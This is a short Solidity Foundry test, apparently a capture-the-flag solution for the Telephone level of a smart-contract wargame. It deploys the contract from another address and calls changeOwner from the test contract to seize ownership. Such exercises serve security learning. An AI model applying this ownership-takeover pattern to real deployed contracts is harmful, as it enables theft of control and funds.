// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/04_telephone.sol";

contract AttackerTelephoneTest is Test {
    function testTelephone() external {
        vm.prank(address(0x1));
        Telephone telephone = new Telephone();

        assertFalse(telephone.owner() == msg.sender);
        telephone.changeOwner(msg.sender);
        assertTrue(telephone.owner() == msg.sender);
    }
}
